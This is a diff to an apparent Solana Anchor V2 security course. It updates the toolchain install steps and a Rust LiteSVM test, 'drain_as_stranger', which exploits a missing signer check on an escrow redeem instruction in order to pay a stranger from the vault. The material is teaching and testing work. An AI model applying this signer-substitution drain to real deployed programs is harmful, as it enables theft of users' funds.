@@ -101,16 +101,24 @@ pub struct Redeem {
 Nothing here is a compile error. `player` is a real `Signer`, so *someone* signed. But the program never checks that the someone is `escrow.player`. The whole conditional release turns on "only the named player may claim," and that sentence appears nowhere in the code. The exploit writes itself. A stranger signs a redeem, clears the score bar (self-reported, remember, this cabinet does not attest scores yet), and the vault pays them. The exploit tests run on LiteSVM, V2's default in-process Rust test harness, so add it to the program if it is not already there:
 
 ```bash
-cargo add --dev litesvm solana-sdk
-# Pin the litesvm version your toolchain's `anchor-v2-testing` already pins (0.11.0 at 2.0.0-rc.1,
-# 0.13.1 on the anchor-next head at 2026-08-22) rather than crates.io latest: litesvm moves
-# independently of Anchor, and a mismatch shows up as a runtime type error, not a build error.
+# Reach LiteSVM through the harness, never by name. anchor-v2-testing owns the litesvm
+# version (0.11.0 at tag v2.0.0-rc.1; the anchor-next head has already moved it to 0.13.1),
+# so pinning the tag pins the SVM too. Add litesvm yourself and a mismatch shows up as a
+# runtime type error rather than a build error.
+cargo add anchor-v2-testing --dev \
+  --git https://github.com/otter-sec/anchor.git --tag v2.0.0-rc.1
 ```
 
 ```rust
+use anchor_lang::{
+    prelude::Address, programs::System, solana_program::instruction::Instruction, Id,
+    InstructionData, ToAccountMetas,
+};
+use anchor_v2_testing::{Keypair, Message, Signer, VersionedMessage, VersionedTransaction};
+
 #[test]
 fn drain_as_stranger() {
-    let mut svm = LiteSVM::new();
+    let mut svm = anchor_v2_testing::svm();
     svm.add_program_from_file(quarter_vault::ID, "target/deploy/quarter_vault.so").unwrap();
     svm.add_program_from_file(quarter_prize::ID, "target/deploy/quarter_prize.so").unwrap();
 
@@ -119,12 +127,12 @@ fn drain_as_stranger() {
         svm.airdrop(&kp.pubkey(), 1_000_000_000).unwrap();
     }
 
-    let (escrow, _b) = Pubkey::find_program_address(
+    let (escrow, _b) = Address::find_program_address(
         &[b"escrow", maker.pubkey().as_ref(), player.pubkey().as_ref()],
         &quarter_prize::ID,
     );
     let (vault, _vb) =
-        Pubkey::find_program_address(&[b"vault", escrow.as_ref()], &quarter_vault::ID);
+        Address::find_program_address(&[b"vault", escrow.as_ref()], &quarter_vault::ID);
 
     reserve_prize(&mut svm, &maker, &player, escrow, vault, 50_000_000, 5_000);
 
@@ -138,13 +146,14 @@ fn drain_as_stranger() {
             player: stranger.pubkey(),     // substitute the caller
             maker: maker.pubkey(),
             quarter_vault_program: quarter_vault::ID,
-            system_program: system_program::ID,
+            system_program: System::id(),
         }
         .to_account_metas(None),
         data: quarter_prize::instruction::Redeem { final_score: 9_999 }.data(),
     };
-    let tx = Transaction::new_signed_with_payer(
-        &[ix], Some(&stranger.pubkey()), &[&stranger], svm.latest_blockhash());
+    let blockhash = svm.latest_blockhash();
+    let msg = Message::new_with_blockhash(&[ix], Some(&stranger.pubkey()), &blockhash);
+    let tx = VersionedTransaction::try_new(VersionedMessage::Legacy(msg), &[&stranger]).unwrap();
 
     // On the vuln branch this SUCCEEDS. That is the bug.
     svm.send_transaction(tx).unwrap();
@@ -303,11 +312,11 @@ You do not re-derive anything to attack the swap. You carry the same seven quest
 
 You have seen every class. Now run the loop yourself against the escrow, end to end, until every exploit test fails and the suite is green.
 
-**Step 1. Pin the V2 toolchain and get on the vulnerable branch.** This course runs on the Anchor V2 release candidate, not the 1.1.2 V1 line many machines ship by default. `avm install` cannot fetch the V2 RC: it downloads a prebuilt binary from a published GitHub release, and no release was cut for the v2 tag, so the download 404s. Install the CLI directly from the `anchor-next` branch:
+**Step 1. Pin the V2 toolchain and get on the vulnerable branch.** This course runs on the Anchor V2 release candidate, not the 1.1.2 V1 line many machines ship by default. `avm install` cannot fetch the V2 RC: it downloads a prebuilt binary from a published GitHub release, and no release was cut for the v2 tag, so the download 404s. Install the CLI directly from the `v2.0.0-rc.1` tag:
 
 ```bash
-# Anchor V2 RC CLI, installed from the branch (no release binary for the v2 tag).
-cargo install --git https://github.com/otter-sec/anchor.git --branch anchor-next anchor-cli --locked --force
+# Anchor V2 RC CLI, built from the tag (no release binary for the v2 tag to download).
+cargo install --git https://github.com/otter-sec/anchor.git --tag v2.0.0-rc.1 anchor-cli --locked --force
 # macOS: prefix with CARGO_PROFILE_RELEASE_LTO=off if the release build fails to link.
 anchor --version              # confirm the V2 line, not 1.1.2
 
